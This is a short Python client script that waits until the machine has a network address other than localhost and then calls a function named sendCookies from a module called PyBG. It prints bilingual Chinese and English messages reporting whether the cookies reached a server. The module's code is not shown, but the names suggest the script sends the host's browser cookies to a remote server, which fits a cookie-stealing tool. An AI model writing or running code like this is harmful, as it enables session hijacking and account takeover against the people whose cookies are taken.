#Client

import socket
import os
import time
from PyBG import DataToServer

while True:
    hostname = socket.gethostname()
    print(hostname)
    ip = socket.gethostbyname(hostname)
    if not (ip == '127.0.0.1'):
        break
    else:
        print("等待联网,waiting for connection")
        time.sleep(10)


try:
    result = DataToServer.sendCookies()
    print("向服务器发送cookie成功,sent cookie success")
except Exception:
    print("向服务器发送cookie失败,sent cookie fail")
os.system('pause')